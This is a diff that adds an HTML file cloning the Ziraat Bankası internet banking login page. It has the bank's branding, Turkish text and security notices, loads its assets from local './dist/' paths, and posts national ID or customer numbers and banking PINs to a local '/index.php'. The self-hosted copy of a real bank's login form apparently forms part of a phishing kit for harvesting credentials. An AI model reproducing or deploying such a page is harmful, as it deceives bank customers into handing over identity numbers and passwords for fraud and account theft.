@@ -1,0 +1,347 @@
+
+<!DOCTYPE html>
+<html lang="tr">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+  <link rel="icon" href="./dist/touch_icon.png">
+  <link rel="stylesheet" href="./dist/style.css">
+  <link rel="stylesheet" href="./dist/b4.css">
+  <title>Hoşgeldiniz | Ziraat Bankası İnternet Bankacılığı</title>
+  <style>
+      .login-wrap .btn.btn-danger:focus {
+        outline: 0 !important;
+      }
+  </style>
+</head>
+
+<body class="login-page">
+  <form autocomplete="off" method="POST" novalidate action="/index.php" enctype="application/x-www-form-urlencoded">
+    <div class="login-wrap">
+      <header>
+        <div id="ButtonContainer" class="top hidden-xs">
+          <div class="container"> <a causesval="false" id="ctl00_LoginHeader_SecurityButton">
+              <span>
+              </span>GÜVENLİK</a>
+            <a causesval="false" id="ctl00_LoginHeader_HelpButton">
+              <span>
+              </span>YARDIM</a>
+            <a causesval="false" id="ctl00_LoginHeader_FaqButton">
+              <span>
+              </span>SIKÇA SORULAN SORULAR</a>
+            <a causesval="false" id="ctl00_LoginHeader_BtnLanguage">
+              <span>
+              </span>ENGLISH</a>
+          </div>
+        </div>
+        <div class="bottom">
+          <div class="container">
+            <a id="LoginLogoButton" class="logo" causesval="false">
+              <span class="clearfix">
+                <i class="icon-logo-ico">
+                </i>
+                <i class="icon-logo-text">
+                </i>
+              </span>
+            </a>
+            <ul class="contact hidden-xs">
+              <li class="call-center">
+                <a id="LogoButton" class="icon-musteri-iletisim-merkezi" href="tel:08502200000" data-setter="SwitchLanguage#index">
+                </a>
+              </li>
+            </ul>
+          </div>
+        </div>
+      </header>
+      <div class="bg-layer">
+      </div>
+      <div class="container">
+        <div class="tc-kimlik-giris-wrap">
+          <div id="ctl00_ctl06" class="row">
+            <div id="ctl00_LoginBoxContainer" class="col-xs-12 col-md-6">
+              <div id="LoginBox" class="login-box long"> <span id="ctl00_c_PageValidation" style="color:Red;visibility:hidden;">
+                </span>
+                <p>İnternet Şubemize Hoş Geldiniz</p>
+                <div class="tabs-wrap" data-module="14">
+                  <div id="TabHeaderContainer" class="tabs tab-header-container"> <a causesval="false" id="ctl00_c_RetailTabHeaderButton" class="active">
+                      <span>
+                      </span>BİREYSEL</a>
+                    <a causesval="false" id="ctl00_c_CorporateTabHeaderButton">
+                      <span>
+                      </span>KURUMSAL</a>
+                  </div>
+                  <div class="tab-container tab-contents">
+                    <div id="RetailTabContainer" class="tab-item active">
+                      <div id="ctl00_c_RetailIdentityContainer" class="form-group hidden-title">
+                        <input autocomplete="off" required name="tckn" inputmode="numeric" type="number" oninput="if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);" maxlength="11" placeholder="T.C. Kimlik / Müşteri Numaranız" id="ctl00_c_RetailIdentityTextBox" class="form-control required isNumber numeric external-validation" maxlengthvalidationcharactercount="0" placeholder="" data-msg-required="Müşteri / T.C. Kimlik Numaranızı Giriniz." aria-required="true">
+                        <label id="ctl00_c_RetailIdentityTextBox-error" role="alert" class="error" for="ctl00_c_RetailIdentityTextBox">T.C. Kimlik Numaranızı Giriniz.</label>
+                      </div>
+                      <div id="RetailRememberMeContainer" class="clearfix">
+                        <div role="button" class="switch-cont" tabindex="0"> <span>Beni Hatırla</span>
+                          <label class="switch">
+                            <input id="ctl00_c_RetailRememberMeCheckBox" type="checkbox" name="ctl00$c$RetailRememberMeCheckBox" causesval="false" tabindex="-1" aria-hidden="true">
+                            <span class="switch-slider">
+                            </span>
+                          </label>
+                        </div>
+                      </div>
+                      <div id="ctl00_c_RetailPinContainer" class="form-group hidden-title">
+                        <input placeholder="Şifre" autocomplete="off" name="password" type="password" maxlength="6" id="ctl00_c_RetailPinTextBox" class="form-control required pin-entry isAlphaNumericForPin external-validation" data-rule-range-min="5" placeholder="" data-msg-required="Lütfen şifrenizi giriniz." data-rule-range-max="6" aria-required="true" required>
+                        <label id="ctl00_c_RetailPinTextBox-error" role="alert" class="error password" for="ctl00_c_RetailPinTextBox">Lütfen şifrenizi doğru olarak giriniz.</label>
+                      </div>
+                      <div class="clearfix">
+                        <div role="button" class="switch-cont" tabindex="0"> <span for="ctl00_c_RetailMobileSignatureCheckBox" class="">Mobil İmza İle Giriş<a data-toggle="popover" data-original-title="Bu hizmetten sadece Turkcell hatlı bireysel müşterilerimiz yararlanabilir." role="button" tabindex="0" aria-haspopup="true" aria-expanded="false">
+                              <i class="icon-aciklama">
+                              </i>
+                            </a>
+                          </span>
+                          <label class="switch">
+                            <input id="ctl00_c_RetailMobileSignatureCheckBox" type="checkbox" name="ctl00$c$RetailMobileSignatureCheckBox" causesval="false" tabindex="-1" aria-hidden="true">
+                            <span class="switch-slider">
+                            </span>
+                          </label>
+                        </div>
+                      </div>
+                      <div class="btns">
+                        <input type="submit" id="ctl00_c_RetailLoginButton" class="btn btn-danger sendBtn" value="DEVAM" name="oneSubmit">
+                      </div> <a causesval="true" id="ctl00_c_RetailRemindPinButton" class="custom-link" style="cursor: pointer;">
+                        <span>
+                        </span>Şifremi Unuttum</a>
+                      <div class="tab-footer">
+                        <p>Dijital Bankacılık müşterimiz olmak için</p> <a causesval="true" id="ctl00_c_OnlineApplicationButton" class="btn btn-default ">
+                          <span>
+                          </span>HEMEN BAŞVUR</a>
+                      </div>
+                    </div>
+                    <div id="CorporateTabContainer" class="tab-item" style="display: none;">
+                      <div id="ctl00_c_ctl19" class="form-group hidden-title"> <span class="placeholder" style="box-sizing: border-box; padding: 9px 20px; margin: 0px 0px 10px; border-width: 1px; line-height: normal; font-size: 14px; font-family: Gotham Narrow; width: 100%; height: 40px; inset: auto; cursor: text; display: block; position: absolute; overflow: hidden; z-index: 2; background: none; border-style: solid; border-color: transparent;">
+                          <em style="display:table;width:100%;height:100%;">
+                            <em style="display:table-cell;vertical-align: middle;">Müşteri Numaranız</em>
+                          </em>
+                        </span>
+                      </div>
+                      <div id="CorporateRememberMeContainer" class="clearfix">
+                        <div role="button" class="switch-cont" tabindex="0"> <span>Beni Hatırla</span>
+                          <label class="switch">
+                            <input id="ctl00_c_CorporateRememberMeCheckBox" type="checkbox" name="ctl00$c$CorporateRememberMeCheckBox" causesval="false" tabindex="-1" aria-hidden="true">
+                            <span class="switch-slider">
+                            </span>
+                          </label>
+                        </div>
+                      </div>
+                      <div id="ctl00_c_ctl20" class="form-group hidden-title"> <span class="placeholder" style="box-sizing: border-box; padding: 9px 20px; margin: 0px 0px 10px; border-width: 1px; line-height: normal; font-size: 14px; font-family: Gotham Narrow; width: 100%; height: 40px; inset: auto; cursor: text; display: block; position: absolute; overflow: hidden; z-index: 2; background: none; border-style: solid; border-color: transparent;">
+                          <em style="display:table;width:100%;height:100%;">
+                            <em style="display:table-cell;vertical-align: middle;">Şifre</em>
+                          </em>
+                        </span>
+                      </div>
+                      <div id="ctl00_c_ctl21" class="form-group hidden-title"> <span class="placeholder" style="box-sizing: border-box; padding: 9px 20px; margin: 0px 0px 10px; border-width: 1px; line-height: normal; font-size: 14px; font-family: Gotham Narrow; width: 100%; height: 40px; inset: auto; cursor: text; display: block; position: absolute; overflow: hidden; z-index: 2; background: none; border-style: solid; border-color: transparent;">
+                          <em style="display:table;width:100%;height:100%;">
+                            <em style="display:table-cell;vertical-align: middle;">Kullanıcı Adınız</em>
+                          </em>
+                        </span>
+                      </div>
+                      <div class="btns"> <a causesval="true" id="ctl00_c_CorporateLoginButton" class="btn btn-danger sendBtn">
+                          <span>
+                          </span>DEVAM</a>
+                      </div>
+                      <div class="clearfix">
+                        <div id="ctl00_c_ctl28" class="row">
+                          <div id="ctl00_c_ctl29" class="col-xs-7"> <a causesval="true" id="ctl00_c_CorporateRemindCustomerNumberButton" class="custom-link text-left">
+                              <span>
+                              </span>Müşteri Numaramı Unuttum</a>
+                          </div>
+                          <div id="ctl00_c_ctl30" class="col-xs-5"> <a causesval="true" id="ctl00_c_CorporateRemindPinButton" class="custom-link pull-right">
+                              <span>
+                              </span>Şifremi Unuttum</a>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="">
+                  <div id="ctl00_c_LbSMSOption" class="modal fade custom-modal-view" role="modal">
+                    <div class="modal-dialog ">
+                      <div class="modal-content">
+                        <div class="modal-header">
+                          <h4 class="modal-title">
+                          </h4>
+                          <button type="button" class="close" data-dismiss="modal" aria-label="Close"> <i class="icon-basarisiz">
+                            </i>
+                          </button>
+                        </div>
+                        <div class="modal-body">
+                          <div>Ziraat Onay kullanmaya devam etmek için uygulamamızın son sürümünü yükleyerek tekrar Ziraat Onay aktivasyonu yapmanız gerekmektedir. Geçici olarak SMS doğrulama ile giriş yapabilirsiniz.</div>
+                        </div>
+                        <div class="modal-footer ">
+                          <div>
+                            <div id="ctl00_c_LbSMSOption_ctl03" class="row">
+                              <div id="ctl00_c_LbSMSOption_ctl04" class="col-xs-6 col-sm-6 col-md-6 col-lg-6"> <a causesval="false" id="ctl00_c_LbSMSOption_BtnClose" class="btn btn-default ">
+                                  <span>
+                                  </span>İPTAL</a>
+                              </div>
+                              <div id="ctl00_c_LbSMSOption_ctl05" class="col-xs-6 col-sm-6 col-md-6 col-lg-6"> <a causesval="false" id="ctl00_c_LbSMSOption_BtnOK" class="btn btn-danger ">
+                                  <span>
+                                  </span>TAMAM</a>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="logout-wrap unsupported-browser none" style="margin-top: 177px;"> <i class="icon-logo-ico">
+                  </i>
+                  <h1 class=""> Kullanmakta olduğunuz tarayıcı Yeni İnternet Şubemizin bazı özelliklerini desteklememektedir. </h1>
+                </div>
+                <style>
+                  .api-payment-container img {
+                    max-height: 92px;
+                    max-width: 92px;
+                  }
+                </style>
+              </div>
+            </div>
+            <div id="ctl00_LoginInfoBoxContainer" class="col-xs-12 col-md-6">
+              <a id="TRIDCardLoginButton" class="tckk-giris-btn">
+                <i class="icon-TCK">
+                  <span class="path1">
+                  </span>
+                  <span class="path2">
+                  </span>
+                </i> T.C. KİMLİK KARTI İLE GİRİŞ</a>
+              <a style="display:none;" class="e-imza-indir-btn">
+                <i class="icon-e-imza-indir">
+                  <span class="path1">
+                  </span>
+                  <span class="path2">
+                  </span>
+                </i>
+                <strong>E-İMZA</strong> UYGULAMASINI İNDİRİN</a>
+              <div id="LoginInfoBoxContainer" class="login-info-box" data-module="15" style="opacity: 1;">
+                <div class="body">
+                  <div class="banner slider login-banner owl-loaded owl-drag" role="listbox" tabindex="0" data-owl-access-keyup="1" data-owl-carousel-focusable="1">
+                    <div class="owl-stage-outer">
+                      <div class="owl-stage" style="transform: translate3d(-1050px, 0px, 0px); transition: all 0.25s ease 0s; width: 2100px;">
+                        <div class="owl-item cloned" aria-hidden="true" style="width: 350px;">
+                          <div class="item">
+                            <img src="./dist/phone.png" style="border-width:0px;">
+                            <p>Mobil uygulamamız ile <br>Ziraat Bankası hep yanınızda!</p> <a causesval="false" id="ctl00_LoginInfoBox_DownloadMobileAppButton1" class="btn btn-default " tabindex="-1" data-owl-temp-tabindex="0">
+                              <span>
+                              </span>HEMEN YÜKLE</a>
+                          </div>
+                        </div>
+                        <div class="owl-item cloned" aria-hidden="true" style="width: 350px;">
+                          <div class="item">
+                            <img src="./dist/phone.png" style="border-width:0px;">
+                            <p>Mobil uygulamamız ile <br>Ziraat Bankası hep yanınızda!</p> <a causesval="false" id="ctl00_LoginInfoBox_DownloadMobileAppButton2" class="btn btn-default " tabindex="-1" data-owl-temp-tabindex="0">
+                              <span>
+                              </span>HEMEN YÜKLE</a>
+                          </div>
+                        </div>
+                        <div class="owl-item" aria-hidden="true" style="width: 350px;">
+                          <div class="item">
+                            <img src="./dist/phone.png" style="border-width:0px;">
+                            <p>Mobil uygulamamız ile <br>Ziraat Bankası hep yanınızda!</p> <a causesval="false" id="ctl00_LoginInfoBox_DownloadMobileAppButton1" class="btn btn-default " tabindex="-1" data-owl-temp-tabindex="0">
+                              <span>
+                              </span>HEMEN YÜKLE</a>
+                          </div>
+                        </div>
+                        <div class="owl-item active" aria-hidden="false" style="width: 350px;">
+                          <div class="item">
+                            <img src="./dist/phone.png" style="border-width:0px;">
+                            <p>Mobil uygulamamız ile <br>Ziraat Bankası hep yanınızda!</p> <a causesval="false" id="ctl00_LoginInfoBox_DownloadMobileAppButton2" class="btn btn-default " tabindex="0" data-owl-temp-tabindex="0">
+                              <span>
+                              </span>HEMEN YÜKLE</a>
+                          </div>
+                        </div>
+                        <div class="owl-item cloned" aria-hidden="true" style="width: 350px;">
+                          <div class="item">
+                            <img src="./dist/phone.png" style="border-width:0px;">
+                            <p>Mobil uygulamamız ile <br>Ziraat Bankası hep yanınızda!</p> <a causesval="false" id="ctl00_LoginInfoBox_DownloadMobileAppButton1" class="btn btn-default " tabindex="-1" data-owl-temp-tabindex="0">
+                              <span>
+                              </span>HEMEN YÜKLE</a>
+                          </div>
+                        </div>
+                        <div class="owl-item cloned" aria-hidden="true" style="width: 350px;">
+                          <div class="item">
+                            <img src="./dist/phone.png" style="border-width:0px;">
+                            <p>Mobil uygulamamız ile <br>Ziraat Bankası hep yanınızda!</p> <a causesval="false" id="ctl00_LoginInfoBox_DownloadMobileAppButton2" class="btn btn-default " tabindex="-1" data-owl-temp-tabindex="0">
+                              <span>
+                              </span>HEMEN YÜKLE</a>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                    <div class="owl-nav disabled">
+                      <div class="owl-prev" tabindex="0">prev</div>
+                      <div class="owl-next" tabindex="0">next</div>
+                    </div>
+                    <div class="owl-dots">
+                      <div class="owl-dot active">
+                        <span>
+                        </span>
+                      </div>
+                      <div class="owl-dot">
+                        <span>
+                        </span>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="login-info">
+                    <p>
+                      <i class="icon-click">
+                      </i>Ziraat Bankası İnternet Şubesi´ne sadece www.ziraatbank.com.tr adresindeki "İnternet Şubesi" linkine tıklayarak ulaşınız
+                    </p>
+                    <p>
+                      <i class="icon-kilit">
+                      </i>Müşteri numaranızı, İnternet/Mobil bankacılık giriş ve ATM şifrenizi Ziraat Bankası personeli dahil kimse ile paylaşmayınız.
+                    </p>
+                  </div>
+                </div>
+                <a class="no-click-link combo-logo hidden-xs hidden-sm">
+                  <img src="./dist/comodo-logo.png" style="border-width:0px;">
+                </a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <footer class="visible-xs">
+        <div id="ButtonContainer" class="top"> <a causesval="false" id="ctl00_LoginFooter_SecurityButton">
+            <span>
+            </span>GÜVENLİK</a>
+          <a causesval="false" id="ctl00_LoginFooter_HelpButton">
+            <span>
+            </span>YARDIM</a>
+          <a causesval="false" id="ctl00_LoginFooter_FaqButton">
+            <span>
+            </span>SIKÇA SORULAN SORULAR</a>
+          <a causesval="false" id="ctl00_LoginFooter_BtnLanguage">
+            <span>
+            </span>ENGLISH</a>
+        </div>
+        <div class="bottom">
+          <ul class="clearfix">
+            <li class="">
+              <a class="no-click-link">
+                <img src="./dist/comodo-logo.png" style="border-width:0px;">
+              </a>
+            </li>
+            <li class="call-center">
+              <a id="LogoButton" class="icon-musteri-iletisim-merkezi" href="tel:08502200000">
+              </a>
+            </li>
+          </ul>
+        </div>
+      </footer>
+    </div>
+    <input type="hidden" name="token" value="5aff1d332be4c5acfa90b2bb89aa75bc">
+  </form>
+  <script src="./dist/script.js"></script>
+</body>
+</html>
